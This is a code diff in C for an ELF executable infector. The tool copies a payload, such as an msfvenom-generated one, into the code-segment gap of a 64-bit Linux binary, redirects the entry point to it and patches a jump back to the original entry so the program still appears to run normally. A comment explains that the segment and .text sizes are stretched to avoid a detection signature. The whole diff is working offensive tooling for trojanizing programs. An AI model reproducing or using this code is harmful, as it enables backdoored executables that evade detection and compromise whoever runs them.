@@ -5,7 +5,6 @@
  * TODO:
  * 		- Add x86 support
  * 		- Add marker for already injected files
- * 		- Check for valid ELF header
  *
  *	Features:
  *		- Uses a relative jump towards OEP (compatible with ASLR)
@@ -28,11 +27,10 @@ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLI
 #include <sys/mman.h>
 #include <sys/stat.h>
 #include <fcntl.h>
-#include <elf.h>
 #include <string.h>
 #include <stdlib.h>
-#include <stdint.h>
-#include <unistd.h>
+#include "elf64.h"
+
 
 #define NOP_OPCODE 0x90
 #define REL_LONG_JMP_OPCODE 0xE9
@@ -56,7 +54,7 @@ int open_and_map_elf(char *fname, uint8_t **data, uint8_t write_back){
   if(write_back){
     *data = mmap(0, len, PROT_READ|PROT_WRITE, MAP_SHARED, fileno(fd), 0);
   } else {
-    *data = mmap(0, len, PROT_READ|PROT_WRITE, MAP_PRIVATE, fileno(fd), 0);
+    *data = mmap(0, len + SIZE_OF_REL_LONG_JUMP, PROT_READ|PROT_WRITE, MAP_PRIVATE, fileno(fd), 0);
   }
 
   if(*data == MAP_FAILED){
@@ -68,59 +66,28 @@ int open_and_map_elf(char *fname, uint8_t **data, uint8_t write_back){
   return fileno(fd);
 }
 
-Elf64_Phdr* find_elf_gap(uint8_t *data, Elf64_Ehdr* elf_header, uint64_t *gap_offset, uint64_t *gap_size){
-  //Find loadable & executable segment
-  Elf64_Phdr* program_header = (Elf64_Phdr*)&data[elf_header->e_phoff];
-  Elf64_Phdr* code_segment = NULL;
-  Elf64_Phdr* next_segment = NULL;
-  for(uint16_t i = 0; i < elf_header->e_phnum; i++){
-    if(program_header->p_type == PT_LOAD && program_header->p_flags & 0x011){
-      code_segment = program_header;
-      next_segment = (Elf64_Phdr*)&data[elf_header->e_phoff + (elf_header->e_phentsize * i)];
-      break;    
-    }
-    program_header = (Elf64_Phdr*)&data[elf_header->e_phoff + (elf_header->e_phentsize * i)];
+uint8_t verify_elf_signature(char *data){
+  if(data[1] == 'E' && data[2] == 'L' && data[3] == 'F'){
+    return 1;
   }
-
-  if(!code_segment || !next_segment){
-    printf("[-] Error couldnt find code segment or the next segment\n");
-	return NULL;
-  }
-
-  *gap_offset = code_segment->p_offset + code_segment->p_filesz;
-  *gap_size = next_segment->p_offset - *gap_offset;
-
-  printf("[+] Gap found at 0x%x (%d bytes available)\n", *gap_offset, *gap_size);
-  return code_segment;
+  return 0;
 }
 
-
-Elf64_Shdr * elfi_find_section (uint8_t *data, char *name){
-  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
-  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
-  Elf64_Shdr *sh_strtab = &shdr[elf_hdr->e_shstrndx];
-  const char *const sh_strtab_p = data + sh_strtab->sh_offset;
- 
-  char *sname = NULL;
-  for (uint16_t i = 0; i < elf_hdr->e_shnum; i++)
-    {
-      sname = (char*) (sh_strtab_p + shdr[i].sh_name);
-      if (!strcmp (sname, name))  return &shdr[i];
-    }
-  
-  return NULL;
-}
 
 int main (int argc, char **argv){
   uint8_t *data = NULL;
   int fd = open_and_map_elf(argv[1], &data, 1);
+  if(!verify_elf_signature(data)){
+    printf("[-] Target not a valid ELF executable!\n");
+	return 1;
+  }
 
   Elf64_Ehdr *elf_hdr = (Elf64_Ehdr *) data;
   printf("[+] Entry point: %p\n", (void*) elf_hdr->e_entry);
 
   //Find an gap
   uint64_t gap_offset = 0, gap_size = 0;
-  Elf64_Phdr *code_segment = find_elf_gap(data, elf_hdr, &gap_offset, &gap_size);
+  Elf64_Phdr *code_segment = find_elf64_gap(data, elf_hdr, &gap_offset, &gap_size);
   if(!code_segment){
     printf("[-] Unable to find code segment!\n");
 	return -1;
@@ -128,21 +95,53 @@ int main (int argc, char **argv){
 
   uint8_t *payload_data = NULL;
   int payload_fd = open_and_map_elf(argv[2], &payload_data, 0);
+  if(!verify_elf_signature(payload_data)){
+    printf("[-] Payload not a valid ELF executable!\n");
+	return 1;
+  }
 
-  Elf64_Shdr *payload_text_section = elfi_find_section(payload_data, ".text");
-  printf("[+] Size of payload is %d bytes\n", payload_text_section->sh_size);
 
-  if(payload_text_section->sh_size > gap_size){
+  //Get payload data
+  uint64_t payload_size = 0;
+  uint64_t payload_offset = 0;
+  
+  Elf64_Shdr *payload_text_section = find_elf64_section(payload_data, ".text");
+  if(payload_text_section){
+    payload_size = payload_text_section->sh_size;
+	payload_offset = payload_text_section->sh_offset;
+  } else {
+    printf("[w] No .text section found inside payload ELF (may be caused by sectionless ELFs, like those created by msfvenom)\n");
+	printf("[+] Trying to use the code segment\n");
+	Elf64_Phdr *payload_code_segment = find_elf64_code_segment(payload_data, elf_hdr, NULL);
+	if(!payload_code_segment) {
+	  printf("[-] No code segment was found inside ELF payload... Aborting\n");
+  	  return 1;
+	}
+	payload_size = payload_code_segment->p_filesz;
+	payload_offset = payload_code_segment->p_offset;
+	
+	if(payload_offset == 0){
+	  printf("[w] Payload offset at 0, trying to guess the start ... this is getting tricky\n");
+	  Elf64_Ehdr *payload_elf_header = (Elf64_Ehdr *)payload_data;
+	  payload_offset = payload_elf_header->e_ehsize + (payload_elf_header->e_phentsize * payload_elf_header->e_phnum);	
+	  printf("[i] Guessed payload offset: %i bytes from start\n", payload_offset);
+	}
+  }	
+
+  printf("[+] Size of payload is %d bytes\n", payload_size);
+  if(payload_size > gap_size){
     printf("[-] Gap size to small for payload!\n");
-    exit(1);
+    return 1;
   }
 
 
   //Find NOPs inside payload
   uint32_t nop_offset = 0;
-  for(uint32_t i = 0; i < payload_text_section->sh_size; i++){
-    if(payload_data[payload_text_section->sh_offset + i] == NOP_OPCODE){
-      nop_offset = payload_text_section->sh_offset + i;
+  printf("Size of payload: %i\n", payload_size);
+  printf("Offset of payload: %i\n", payload_offset);
+  for(uint32_t i = 0; i < payload_size; i++){
+    if(payload_data[payload_offset + i] == NOP_OPCODE){
+      nop_offset = payload_offset + i;
       break;
     }
   }
@@ -150,11 +149,12 @@ int main (int argc, char **argv){
   //Check if NOPs are found
   if(nop_offset == 0){
 	printf("[-] NOPs not found inside payload, are they present?\n");
-	return 0;
+    return 1;
   }
 
+
   //Calc offset to org_ep  
-  uint32_t offset_to_start_of_payload = (nop_offset - payload_text_section->sh_offset) + SIZE_OF_REL_LONG_JUMP;
+  uint32_t offset_to_start_of_payload = (nop_offset - payload_offset) + SIZE_OF_REL_LONG_JUMP;
   uint32_t offset_to_org_ep = (gap_offset - elf_hdr->e_entry) + offset_to_start_of_payload;
 
   //Offset_to_org_ep is the number of bytes we need to jump, however we need to jump back since we injected at the end of .text section
@@ -170,17 +170,17 @@ int main (int argc, char **argv){
   payload_data[nop_offset + 4] = (uint8_t)(jmp_value>>24);
 
   //Copy payload to target
-  memmove(&data[gap_offset], &payload_data[payload_text_section->sh_offset], payload_text_section->sh_size); 
+  memmove(&data[gap_offset], &payload_data[payload_offset], payload_size); 
   elf_hdr->e_entry = (Elf64_Addr) gap_offset;
 
   //Stretching is done to prevent a signature where the EP is outside of the .text section (or any section for that matter)
   //Stretch code segment to include injected code
-  code_segment->p_filesz += payload_text_section->sh_size;
-  code_segment->p_memsz += payload_text_section->sh_size;
+  code_segment->p_filesz += payload_size;
+  code_segment->p_memsz += payload_size;
 
   //Stretch .text section 
-  Elf64_Shdr *text_section = elfi_find_section(data, ".text"); 
-  text_section->sh_size += payload_text_section->sh_size; 
+  Elf64_Shdr *text_section = find_elf64_section(data, ".text"); 
+  text_section->sh_size += payload_size; 
 
 
   printf("[+] New entrypoint at 0x%x\n", gap_offset); 
